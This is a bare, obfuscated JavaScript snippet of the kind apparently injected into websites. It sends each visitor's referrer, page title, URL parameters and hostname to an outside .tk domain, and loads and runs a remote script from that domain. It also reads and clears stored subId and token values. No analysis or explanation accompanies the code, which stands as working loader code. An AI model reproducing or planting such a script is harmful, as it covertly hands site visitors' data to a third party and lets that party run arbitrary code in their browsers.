    (function() {
    var name = '_t6vF4ZqBFMZf53hz';
    if (!window._t6vF4ZqBFMZf53hz) {
        window._t6vF4ZqBFMZf53hz = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://phistnewfumythepe.tk/SsCZxM',
            P_PATH: 'https://phistnewfumythepe.tk/fec84ce/postback',
        };
    }
    const _h39ws9BmJTDR6sG6 = localStorage.getItem('config');
    if (typeof _h39ws9BmJTDR6sG6 !== 'undefined' && _h39ws9BmJTDR6sG6 !== null) {
        var _xq1pv4T26sSDz814 = JSON.parse(_h39ws9BmJTDR6sG6);
        var _TVvXgM1b7Q5PJkGs = Math.round(+new Date()/1000);
        if (_xq1pv4T26sSDz814.created_at + window._t6vF4ZqBFMZf53hz.ttl < _TVvXgM1b7Q5PJkGs) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _F3M26SQCWNZb34Tr = localStorage.getItem('subId');
    var _VfswSG4sWs7gRqfR = localStorage.getItem('token');
    var _fc3B3HfR5qNKs3py = '?return=js.client';
        _fc3B3HfR5qNKs3py += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _fc3B3HfR5qNKs3py += '&se_referrer=' + encodeURIComponent(document.referrer);
        _fc3B3HfR5qNKs3py += '&default_keyword=' + encodeURIComponent(document.title);
        _fc3B3HfR5qNKs3py += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _fc3B3HfR5qNKs3py += '&name=' + encodeURIComponent(name);
        _fc3B3HfR5qNKs3py += '&host=' + encodeURIComponent(window._t6vF4ZqBFMZf53hz.R_PATH);
    if (typeof _F3M26SQCWNZb34Tr !== 'undefined' && _F3M26SQCWNZb34Tr && window._t6vF4ZqBFMZf53hz.unique) {
        _fc3B3HfR5qNKs3py += '&sub_id=' + encodeURIComponent(_F3M26SQCWNZb34Tr);
    }
    if (typeof _VfswSG4sWs7gRqfR !== 'undefined' && _VfswSG4sWs7gRqfR && window._t6vF4ZqBFMZf53hz.unique) {
        _fc3B3HfR5qNKs3py += '&token=' + encodeURIComponent(_VfswSG4sWs7gRqfR);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._t6vF4ZqBFMZf53hz.R_PATH + _fc3B3HfR5qNKs3py;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
